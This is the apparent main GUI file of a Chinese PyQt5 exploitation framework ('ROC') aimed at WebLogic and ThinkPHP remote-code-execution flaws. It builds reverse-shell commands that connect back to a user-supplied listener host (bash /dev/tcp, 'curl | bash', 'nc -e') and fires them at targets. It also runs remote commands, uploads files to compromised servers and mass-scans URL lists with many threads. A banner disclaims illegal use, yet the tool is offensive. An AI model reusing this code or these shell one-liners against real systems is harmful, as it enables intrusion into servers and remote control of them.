#!/usr/bin/python3.8
# -*- coding: utf-8 -*-
# @Time    : 2020/6/26 5:51 下午
# @Author  : rocky
# @Email   : 939555035@qq.com
# @File    : run-main.py
# @Software: PyCharm


import sys
import logging
from datetime import datetime
import threading
import OperatingUi
import hashlib
from threading import Thread
from PyQt5.QtCore import pyqtSignal,QObject
from PyQt5.QtWidgets import QApplication, QMainWindow, QFileDialog
from controller import rocCheckController, rocCommandController, rocUploadFileController, rocReboundController
from PyQt5.QtWidgets import QMessageBox
from database.SQLite_tools import SQLite_tools
from linkage.linkage.linkage import linkAllAge
import requests
import time, random
from PyQt5 import QtCore


# 取消SSL证书错误告警
requests.packages.urllib3.disable_warnings()

# Headers 信息配置

def getTime():
    """
    :param message:时间戳 设置
    :return:当前时间
    """
    now = datetime.now()
    return now.strftime('%H:%M:%S')


def showSuccess(message):
    """
    :param message:设置输出样式,带有彩色样式标记
    :return:无返回值
    """
    print('[\033[1;94m{}\033[0;m] [\033[1;92m+\033[0;m] \033[1;92m{}\033[0;m'.format(getTime(), message))

class MainWindow(QMainWindow, QObject):
    send_args = pyqtSignal(str, int)
    send_sing = pyqtSignal(str)
    commandBasicInfo = pyqtSignal(str)  # 命令执行结果信号获取
    textEditinfo = pyqtSignal(str)
    status_textEdit = pyqtSignal(str)

    def __init__(self, parent=None):
        super(MainWindow, self).__init__(parent)
        self.ui = OperatingUi.Ui_MainWindow()
        self.ui.setupUi(self)
        self.commandBasicInfo.connect(self.handleDisplayCommand)
        self.textEditinfo.connect(self.handlestatusOne)
        self.status_textEdit.connect(self.status_text)
        self.currentTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        self.event_obj = threading.Event()

    # ui 变化处理
    def handle_ui_change(self):
        self.ui.tabWidget.tabBar().setVisible(False)
        # pass

    # 所有button的消息与槽的通信
    def handle_buttons(self):
        self.ui.treeWidget.clicked.connect(self.onTreeClicked)

    # 选项卡的联动
    def vul_weblogic(self):
        self.ui.tabWidget.setCurrentIndex(0)

    def setupFunction(self):

        items = ["/bin/bash -i >& /dev/tcp/ip/port 0>&1", "curl ip:port | bash", "nc ip port -e /bin/bash"]
        self.ui.reboundCombo.addItems(items)
        commanditems = ["whoami", "ifconfig",
                        "netstat -an", "id"]
        self.ui.commandCombo.addItems(commanditems)
        command_3items = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17",
                          "18", "19", "20", ]
        self.ui.threads_num.addItems(command_3items)
        self.ui.startCheckButton.clicked.connect(self.startBatchCheck)
        self.ui.emptyButton.clicked.connect(self.clearResult)
        self.ui.commondButton.clicked.connect(self.execcommandPayload)
        self.ui.uploadFilesbutton.clicked.connect(self.startUploadFile)
        self.ui.importButton.clicked.connect(self.openfile)
        self.ui.CheckButton.clicked.connect(self.execCheckPayloadb)
        self.ui.reboundButton.clicked.connect(self.startExecReb)
        self.ui.stopCheckButton.clicked.connect(self.stopBatchCheck)

        # 导航展示功能
        _translate = QtCore.QCoreApplication.translate
        sql = SQLite_tools()
        sql.create_SQL('./database/db/database.db')
        data = sql.get_SQLtable_column_parent_id('roc_nav_exploit', 'vul_name', 0)

        for vul_name in data:
            vul_name_id = sql.get_SQLtable_vul_name_id('roc_nav_exploit', '{0}'.format(vul_name))
            topLevel = int(vul_name_id) - 1
            self.ui.treeWidget.topLevelItem(topLevel).setText(0, _translate("MainWindow", "{0}".format(vul_name)))

        data = sql.get_SQLtable_column_parent_id('roc_nav_exploit', 'vul_name', 1)

        for vul_name in data:
            vul_name_id = sql.get_SQLtable_vul_name_id('roc_nav_exploit', '{0}'.format(vul_name))
            child_id = int(vul_name_id) - 4
            self.ui.treeWidget.topLevelItem(0).child(child_id).setText(0,_translate("MainWindow", "{0}".format(vul_name)))

        self.run_add_poc()
        self.save_data()



        basicTxt = '''
警告：本工具为漏洞自查工具，请勿非法攻击他人网站！
ROC漏洞综合利用框架采用动态加载配置文件
集成情况：
CVE_2017_3248_weblogic 检测 可用
CVE_2017_10271_weblogic 检测 命令执行 反弹shel 文件上传 可用
CVE_2019_2725_weblogic_10_3_6 检测 命令执行 反弹shell 文件上传 可用
CVE_2019_2729_weblogic_01 检测 命令执行 反弹shell 可用
CVE-2020-14882_weblogic_12_1_3 检测 命令执行 反弹shell 文件上传 可用
Thinkphp5.0.10_RCE 检测 命令执行 反弹shell 文件上传 可用
Thinkphp5.0.21_RCE 检测 命令执行 反弹shell 文件上传 可用
Thinkphp5.0.21_RCE_bypass_01 检测 命令执行 反弹shell 文件上传 可用（来源:柠檬菠萝）
Thinkphp5.0.22_RCE 检测 命令执行 反弹shell 文件上传 可用（来源:柠檬菠萝）
Thinkphp5.0.22_RCE_bypass_01 检测 命令执行 反弹shell 文件上传 可用（来源:柠檬菠萝）
Thinkphp5.0.23_RCE 检测 命令执行 反弹shell 文件上传 可用
Thinkphp5.1.29_RCE 检测 命令执行 反弹shell 文件上传 可用

后续持续开发
        '''
        self.ui.basicInfoTextEdit.setText(basicTxt)

    def run_add_poc(self):
        """
        导航栏选项卡联动索引0
        :return:
        """
        self.ui.add_nav_index_data_Button.clicked.connect(self.execAddNavIndex)

    def execAddNavIndex(self):
        """
        多线程执行添加漏洞利用导航索引名称
        :return:
        """
        thread = Thread(target=self.addNavIndex)
        thread.start()

    def addNavIndex(self):

        """
        根据前端VIEW获取的导航索引名称插入到数据库里面
        :return:
        """

        vul_line_data = self.ui.vul_lineEdit.text()  # 获取导航栏漏洞利用索引名称
        vul_line_page = self.ui.vul_indexpage_lineEdit.text()
        vul_hash_data = hashlib.md5(b'!@#$').hexdigest() + str(getTime().encode('utf-8')) + str(random.randint(0, 9))
        vul_hash = hashlib.md5(str(vul_hash_data).encode("utf-8")).hexdigest()

        sql = SQLite_tools()
        sql.create_SQL('./database/db/database.db')
        sql.get_SQLtable_column_name('roc_nav_exploit')
        data = sql.get_SQLtable_vul_name_row('roc_nav_exploit', '{0}'.format(vul_line_data))

        if data:
            self.status_textEdit.emit('[+] 添加失败,数据已存在 {0}'.format(self.currentTime))
        else:
            sql.add_roc_nav_exploit_data(vul_line_data, vul_line_page, vul_hash)
            self.status_textEdit.emit('[+] 添加成功 {0}'.format(self.currentTime))

    def status_text(self, data):
        self.ui.status_textEdit.append(data)

    def msg(self):
        reply = QMessageBox.information(self,  # 使用infomation信息框
                                        "标题",
                                        "消息",
                                        QMessageBox.Yes | QMessageBox.No)

    def save_data(self):
        """
        保存请求数据到数据库
        :return:
        """
        # self.ui.save_Button.clicked.connect(self.savaReqData)

    def savaReqData(self):
        """
        保存数据到数据库
        :return:
        """
        vul_name = self.ui.vul_name_lineEdit.text()  # 漏洞名称
        vul_number = self.ui.vul_number_lineEdit.text()  # 漏洞编号
        author = self.ui.author.text()  # 提交作者
        items = [
            "GET", "POST"
        ]
        method_data = self.ui.method_Combo.addItems(items)  # 请求方法
        is_jump_checkBox = self.ui.jump_checkBox.isChecked()  # 是否跳转
        uri_lineEdit = self.ui.uri_lineEdit.text()  # 测试url
        timeout_data = self.ui.timeout_lineEdit.text()  # 请求超时
        verify_data = self.ui.verify_lineEdit.text()  # https
        header_data = self.ui.headerTextEdit.toPlainText()  #
        post_data = self.ui.postTextEdit.toPlainText()  #
        resp_var = self.ui.var_lineEdit.text()  # 响应变量

    def onTreeClicked(self):
        '''
        链接选项卡
        :return:
        '''
        item = self.ui.treeWidget.currentItem().text(0)
        link_data = linkAllAge()
        data = link_data.runlink(item)
        self.ui.tabWidget.setCurrentIndex(int(data))
        QApplication.processEvents()
        vul_number_data = link_data.vul_number_options(item) #每个框架漏洞编号集合
        self.ui.payloadCombo.clear() #清空下拉框数据
        self.ui.payloadCombo.addItems(vul_number_data)


    def handleDisplayCommand(self, data):
        """
        显示到ui命令执行后返回的结果信号
        :param data:
        :return:
        """
        self.ui.commandBasicInfoTextEdit.setText(data)

    def handleDisplay(self, data):
        self.ui.commandBasicInfoTextEdit_3.append(data)  # 在指定的区域显示提示信息
        self.cursor = self.ui.commandBasicInfoTextEdit_3.textCursor()
        self.ui.commandBasicInfoTextEdit_3.moveCursor(self.cursor.End)  # 光标移到最后，这样就会自动显示出来
        QApplication.processEvents()  # 一定加上这个功能，不然有卡顿

    def handlestatusOne(self, data):
        self.ui.textEdit.append(data)  # 在指定的区域显示提示信息
        # self.cursor = self.ui.textEdit.textCursor()
        # self.ui.textEdit.moveCursor(self.cursor.End)  # 光标移到最后，这样就会自动显示出来
        QApplication.processEvents()  # 一定加上这个功能，不然有卡顿

    def handlestatus(self, data):
        self.ui.textEdit.append(data)  # 在指定的区域显示提示信息
        self.cursor = self.ui.textEdit.textCursor()
        self.ui.textEdit.moveCursor(self.cursor.End)  # 光标移到最后，这样就会自动显示出来
        QApplication.processEvents()  # 一定加上这个功能，不然有卡顿

    def checkPayload(self,targetAddr,payload):
        '''
        检测payload方法
        :return:
        '''

        if "___" in payload:
            _translate = QtCore.QCoreApplication.translate
            sql = SQLite_tools()
            sql.create_SQL('./database/db/database.db')
            data = sql.get_SQLtable_vul_hash('vul_number_relation', '{0}'.format(payload))
            vul_hash = "".join(data)
            data = sql.get_SQLtable_vul_number('vul_number_relation', '{0}'.format(vul_hash))
            for payload in data:
                if "___" not in payload:
                    # module = 'controller.rocCheckController'
                    # importModule = importlib.import_module(module)
                    # data = importModule.rocCheckController.runCheck(self, targetAddr, payload)
                    data = rocCheckController.rocCheckController.runCheck(self, targetAddr, payload)
                    self.textEditinfo.emit('{}'.format(data['data']))
                else:
                    pass
        else:
            # module = 'controller.rocCheckController'
            # importModule = importlib.import_module(module)
            # data = importModule.rocCheckController.runCheck(self, targetAddr, payload)
            data = rocCheckController.rocCheckController.runCheck(self, targetAddr, payload)
            self.textEditinfo.emit('{}'.format(data['data']))

            logger = logging.getLogger(__name__)
            logger.setLevel(level=logging.INFO)
            handler = logging.FileHandler("log.txt")
            handler.setLevel(logging.INFO)
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)

            console = logging.StreamHandler()
            console.setLevel(logging.INFO)

            logger.addHandler(handler)
            logger.addHandler(console)

            logger.info("Start print log")
            logger.debug("Do something")
            logger.warning("Something maybe fail.")
            logger.info("Finish")

    def commandPayload(self):
        """
        利用payload命令执行
        :return:
        """
        targetAddr = self.ui.targetlineEdit.text()  # 获取big页面目标地址
        if 'https://' in targetAddr or 'http://' in targetAddr:
            pass
        else:
            targetAddr = 'http://' + targetAddr
        payload = self.ui.payloadCombo.currentText()
        command = self.ui.commandCombo.currentText()
        # module = 'controller.rocCommandController'
        # importModule = importlib.import_module(module)
        # data = importModule.rocCommandController.runCommand(self, targetAddr, payload,command)
        data = rocCommandController.rocCommandController.runCommand(self, targetAddr, payload, command)
        if data['type'] == 'status':
            self.textEditinfo.emit('{}'.format(data['data']))
        elif data['type'] == 'content':
            self.commandBasicInfo.emit('{}'.format(data['data']))
        else:
            self.textEditinfo.emit('type错误')

    def execRebound(self):
        """
        反弹shell
        :return:
        """
        targetAddr = self.ui.targetlineEdit.text()  # 获取big页面目标地址
        if 'https://' in targetAddr or 'http://' in targetAddr:
            pass
        else:
            targetAddr = 'http://' + targetAddr
        payload = self.ui.payloadCombo.currentText() # 获取payload编号
        lhost = self.ui.lipaddrlineEdit.text()
        print(lhost)
        lport = self.ui.lport.text()
        print(lport)
        rebound = self.ui.reboundCombo.currentText()

        if rebound == 'curl ip:port | bash':
            reboundData = r'curl {}:{} | bash'.format(lhost, lport)
        elif rebound == '/bin/bash -i >& /dev/tcp/ip/port 0>&1':
            reboundData = r'/bin/bash -i > /dev/tcp/{}/{} 0<&1 2>&1'.format(lhost, lport)
        elif rebound == 'nc ip port -e /bin/bash':
            reboundData = r'nc {} {} -e /bin/bash'.format(lhost, lport)
        else:
            return '操作错误'
        # module = 'controller.rocReboundController'
        # importModule = importlib.import_module(module)
        # data = importModule.rocReboundController.runRebound(self, targetAddr,payload,reboundData)
        data = rocReboundController.rocReboundController.runRebound(self, targetAddr, payload, reboundData)
        self.textEditinfo.emit('{}'.format(data['data']))

    def execbackendCheck(self,event):
        """
        执行批量检测
        :return:
        """
        thread_num = int(self.ui.threads_num.currentText())  # 获取线程数
        payload = self.ui.payloadCombo.currentText()  # 获取漏洞Payload
        targetTxtPath = self.ui.importFilePath.text()  # 获取导入文件路径

        print(event.isSet())
        event.wait()
        with open(targetTxtPath, "r") as targetTxtPath:
            # 自动处理开启文件，处理之后会自动关闭，防止过量读取内容占用内存
            url_list = [i.replace("\n", "") for i in targetTxtPath.readlines()]

        sem = threading.Semaphore(thread_num)

        for url in url_list:
            t = threading.Thread(target=self.backendCheckThread, args=(sem,url,payload,event))
            t.start()
            time.sleep(0.1)
        while threading.active_count() != 1:
            pass  # print threading.active_count()
        else:
            print('### Selenium Jobs is over!!!###')

    def backendCheckThread(self,sem,url,payload,event):
        sem.acquire()  # 注意要第一时间去修改计数器 这点很重要

        try:
            event.wait()
            self.checkPayload(url,payload)
        except Exception as ErrorInfo:
            print(ErrorInfo)
        finally:
            sem.release()

    def uploadfile(self):
        """
        上传文件
        :return:
        """
        targetAddr = self.ui.targetlineEdit.text()
        payload = self.ui.payloadCombo.currentText()
        filepath = self.ui.filePathEdit.text()
        checkBox = self.ui.checkBox.text() if self.ui.checkBox.isChecked() else ''
        content = self.ui.commandBasicInfoTextEdit_2.toPlainText()

        # module = 'controller.rocUploadFileController'
        # importModule = importlib.import_module(module)
        # getBasePathData = importModule.rocUploadFileController.runGetBasePath(self, targetAddr, payload , command="set")
        getBasePathData = rocUploadFileController.rocUploadFileController.runGetBasePath(self, targetAddr, payload, command="set")
        filepathAll = getBasePathData['data']

        # data = importModule.rocUploadFileController.runUploadFile(self, targetAddr, payload, filepathAll, checkBox, content ,filepath)
        data = rocUploadFileController.rocUploadFileController.runUploadFile(self, targetAddr, payload, filepathAll, checkBox, content, filepath)
        self.textEditinfo.emit('{}'.format(data['data']))

    def batchCheck(self):
        """
        批量检测这一类的漏洞，并返回存在问题的漏洞编号
        :return:
        """
        return ''

    def execCheckPayloadb(self):
        """
        多线程执行检测，防止ui卡死
        :return:
        """

        targetAddr = self.ui.targetlineEdit.text()  # 获取big页面目标地址
        if 'https://' in targetAddr or 'http://' in targetAddr:
            pass
        else:
            targetAddr = 'http://' + targetAddr

        payload = self.ui.payloadCombo.currentText()

        thread = Thread(target=self.checkPayload,args=(targetAddr,payload))
        thread.start()

    def execcommandPayload(self):
        """
        多线程执行命令，防止ui卡死
        :return:
        """
        thread = Thread(target=self.commandPayload)
        thread.start()

    def startExecReb(self):
        """
        多线程执行反弹，防止ui卡死
        :return:
        """
        thread = Thread(target=self.execRebound)
        thread.start()

    def startUploadFile(self):
        """
        多线程执行文件上传，防止ui卡死
        :return:
        """
        thread = Thread(target=self.uploadfile)
        thread.start()


    def startBatchCheck(self):
        """
        多线程批量检测漏洞,防止
        :return:
        """
         # 创建一个事件
        self.event_obj.clear()
        self.event_obj.set()
        thread = Thread(target=self.execbackendCheck,args=(self.event_obj,))
        thread.start()

    def stopBatchCheck(self):
        """
        停止批量检测漏洞
        :return:
        """
        self.event_obj.clear()

    # 打开文件
    def openfile(self):
        fileName1, filetype = QFileDialog.getOpenFileName(self,
                                                          "选取文件",
                                                          "./",
                                                          "All Files (*);;Text Files (*.txt)")  # 设置文件扩展名过滤,注意用双分号间隔

        return self.ui.importFilePath.setText(fileName1)

    def clearResult(self):
        self.ui.textEdit.clear()

if __name__ == '__main__':
    QApplication.processEvents()
    time.sleep(1)
    app = QApplication(sys.argv)
    win = MainWindow()
    win.handle_buttons()
    win.handle_ui_change()
    win.setupFunction()
    win.show()
    sys.exit(app.exec_())
